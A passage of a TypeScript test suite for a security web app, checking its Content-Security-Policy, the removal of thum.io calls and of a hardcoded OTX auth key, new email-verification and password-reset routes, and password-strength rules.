    expect(html).toContain('http-equiv="Content-Security-Policy"');
    expect(html).toContain("default-src 'self'");
    expect(html).toContain("script-src 'self'");
    // Must NOT permit inline scripts in production policy
    expect(html).not.toMatch(/script-src[^;]*'unsafe-inline'/);
    expect(html).toContain('connect-src');
  });

  it('verifies no active calls to thum.io exist in services to prevent customer data leakage', async () => {
    const fs = await import('fs');
    const path = await import('path');

    const webcheckContent = fs.readFileSync(path.resolve(process.cwd(), 'services/webcheck.ts'), 'utf-8');
    const brandContent = fs.readFileSync(path.resolve(process.cwd(), 'services/brandMonitor.ts'), 'utf-8');

    // Make sure no active URLs to image.thum.io are constructed
    expect(webcheckContent).not.toMatch(/https:\/\/image\.thum\.io/);
    expect(brandContent).not.toMatch(/https:\/\/image\.thum\.io/);
  });
});

describe('Task 103: Self-Serve Signup Routes (/verify-email, /reset-password) & OTX Key Removal', () => {
  it('defines ADMIN_VERIFY_EMAIL, ADMIN_RESET_PASSWORD, and ADMIN_RESEND_VERIFICATION endpoints in config', async () => {
    const { API_ENDPOINTS } = await import('../../config/config');

    expect(API_ENDPOINTS.ADMIN_VERIFY_EMAIL).toBe('/AdminRoutes/verifyEmail');
    expect(API_ENDPOINTS.ADMIN_RESET_PASSWORD).toBe('/AdminRoutes/resetPassword');
    expect(API_ENDPOINTS.ADMIN_RESEND_VERIFICATION).toBe('/AdminRoutes/resendVerification');
  });

  it('verifies authService has verifyEmail, resetPassword, and resendVerification methods', async () => {
    const { authService } = await import('../../api/services/authService');

    expect(typeof authService.verifyEmail).toBe('function');
    expect(typeof authService.resetPassword).toBe('function');
    expect(typeof authService.resendVerification).toBe('function');
  });

  it('ensures services/otxSandbox.ts has no hardcoded AUTH_KEY or secret credentials', async () => {
    const fs = await import('fs');
    const path = await import('path');

    const otxContent = fs.readFileSync(path.resolve(process.cwd(), 'services/otxSandbox.ts'), 'utf-8');

    // Ensure the hardcoded hex auth key is completely gone
    expect(otxContent).not.toContain('AUTH_KEY');
    expect(otxContent).not.toContain('7831d3fca3a2');
    expect(otxContent).not.toMatch(/['"][a-f0-9]{32,}['"]/i);
  });

  it('verifies AppRouter registers /verify-email and /reset-password as public logged-out paths', async () => {
    const fs = await import('fs');
    const path = await import('path');

    const appRouterContent = fs.readFileSync(path.resolve(process.cwd(), 'src/AppRouter.tsx'), 'utf-8');

    expect(appRouterContent).toContain('/verify-email');
    expect(appRouterContent).toContain('/reset-password');
    expect(appRouterContent).toContain('VerifyEmailView');
    expect(appRouterContent).toContain('ResetPasswordView');
    expect(appRouterContent).toContain('PUBLIC_LOGGED_OUT_PATHS');
  });

  it('verifies password criteria logic for reset-password enforces 12 characters, upper, lower, number, symbol', () => {
    const validatePassword = (pwd: string) => ({
      length: pwd.length >= 12,
      hasUpper: /[A-Z]/.test(pwd),
      hasLower: /[a-z]/.test(pwd),
      hasNumber: /[0-9]/.test(pwd),
      hasSymbol: /[^A-Za-z0-9]/.test(pwd),
    });

    const weak = validatePassword('Pass123!');
    expect(weak.length).toBe(false);

    const noSymbol = validatePassword('Password123456');
    expect(noSymbol.hasSymbol).toBe(false);

    const strong = validatePassword('AntitodeSec!2026#');
    expect(Object.values(strong).every(Boolean)).toBe(true);
  });
});
